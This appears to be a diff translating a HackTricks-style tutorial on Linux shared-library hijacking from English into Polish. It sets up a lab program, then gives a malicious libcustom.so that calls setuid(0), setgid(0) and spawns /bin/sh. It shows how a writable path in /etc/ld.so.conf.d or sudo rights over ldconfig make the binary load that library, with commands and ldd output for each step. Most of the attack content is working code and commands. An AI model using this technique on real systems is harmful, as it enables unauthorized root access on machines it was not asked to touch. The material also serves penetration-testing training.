@@ -2,82 +2,71 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Prepare the environment
+## Przygotowanie środowiska
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+W poniższej sekcji znajdziesz kod plików, które zamierzamy użyć do przygotowania środowiska
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
-
 ```c
 #include <stdio.h>
 #include "libcustom.h"
 
 int main(){
-    printf("Welcome to my amazing application!\n");
-    vuln_func();
-    return 0;
+printf("Welcome to my amazing application!\n");
+vuln_func();
+return 0;
 }
 ```
-
 {{#endtab}}
 
 {{#tab name="libcustom.h"}}
-
 ```c
 #include <stdio.h>
 
 void vuln_func();
 ```
-
 {{#endtab}}
 
 {{#tab name="libcustom.c"}}
-
 ```c
 #include <stdio.h>
 
 void vuln_func()
 {
-    puts("Hi");
+puts("Hi");
 }
 ```
-
 {{#endtab}}
 {{#endtabs}}
 
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Utwórz** te pliki na swoim komputerze w tym samym folderze
+2. **Skompiluj** **bibliotekę**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Skopiuj** `libcustom.so` do `/usr/lib`: `sudo cp libcustom.so /usr/lib` (uprawnienia roota)
+4. **Skompiluj** **wykonywalny**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
-### Check the environment
+### Sprawdź środowisko
 
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
-
+Sprawdź, czy _libcustom.so_ jest **ładowane** z _/usr/lib_ i czy możesz **wykonać** binarny.
 ```
 $ ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
-	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
+linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
+libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
 
 $ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
-
 ## Exploit
 
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
-
+W tym scenariuszu założymy, że **ktoś stworzył podatny wpis** w pliku _/etc/ld.so.conf/_:
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
-
+Wrażliwy folder to _/home/ubuntu/lib_ (gdzie mamy dostęp do zapisu).\
+**Pobierz i skompiluj** następujący kod w tym katalogu:
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -86,27 +75,23 @@ The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 #include <sys/types.h>
 
 void vuln_func(){
-    setuid(0);
-    setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+setuid(0);
+setgid(0);
+printf("I'm the bad library\n");
+system("/bin/sh",NULL,NULL);
 }
 ```
+Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w źle skonfigurowanej** ścieżce, musimy poczekać na **ponowne uruchomienie** lub na to, aż użytkownik root wykona **`ldconfig`** (_jeśli możesz wykonać ten plik binarny jako **sudo** lub ma on **bit suid**, będziesz mógł wykonać go samodzielnie_).
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
-
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
-
+Gdy to nastąpi, **sprawdź ponownie**, skąd wykonywalny plik `sharevuln` ładuje bibliotekę `libcustom.so`:
 ```c
 $ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffeee766000)
-	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
+linux-vdso.so.1 =>  (0x00007ffeee766000)
+libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
-
+Jak widać, **ładowanie odbywa się z `/home/ubuntu/lib`** i jeśli jakikolwiek użytkownik to uruchomi, zostanie uruchomiona powłoka:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -114,40 +99,35 @@ I'm the bad library
 $ whoami
 ubuntu
 ```
-
 > [!NOTE]
-> Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+> Zauważ, że w tym przykładzie nie podnieśliśmy uprawnień, ale modyfikując wykonywane polecenia i **czekając na to, aż root lub inny użytkownik z uprawnieniami wykona podatny plik binarny**, będziemy w stanie podnieść uprawnienia.
 
-### Other misconfigurations - Same vuln
+### Inne błędne konfiguracje - Ta sama podatność
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+W poprzednim przykładzie sfałszowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień w pliku konfiguracyjnym w `/etc/ld.so.conf.d/`**.\
+Jednak istnieją inne błędne konfiguracje, które mogą powodować tę samą podatność, jeśli masz **uprawnienia do zapisu** w jakimś **pliku konfiguracyjnym** w `/etc/ld.so.conf.d`, w folderze `/etc/ld.so.conf.d` lub w pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.
 
 ## Exploit 2
 
-**Suppose you have sudo privileges over `ldconfig`**.\
-You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
-So, lets create the files and folders needed to load "/tmp":
-
+**Załóżmy, że masz uprawnienia sudo do `ldconfig`**.\
+Możesz wskazać `ldconfig`, **skąd ładować pliki konfiguracyjne**, więc możemy to wykorzystać, aby `ldconfig` załadował dowolne foldery.\
+Więc stwórzmy pliki i foldery potrzebne do załadowania "/tmp":
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
-
+Teraz, jak wskazano w **poprzednim exploicie**, **stwórz złośliwą bibliotekę w `/tmp`**.\
+A na koniec załadujmy ścieżkę i sprawdźmy, skąd binarny ładuje bibliotekę:
 ```bash
 ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007fffa2dde000)
-	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+linux-vdso.so.1 =>  (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+**Jak widać, mając uprawnienia sudo do `ldconfig`, możesz wykorzystać tę samą lukę.**
 
 {{#include ../../banners/hacktricks-training.md}}
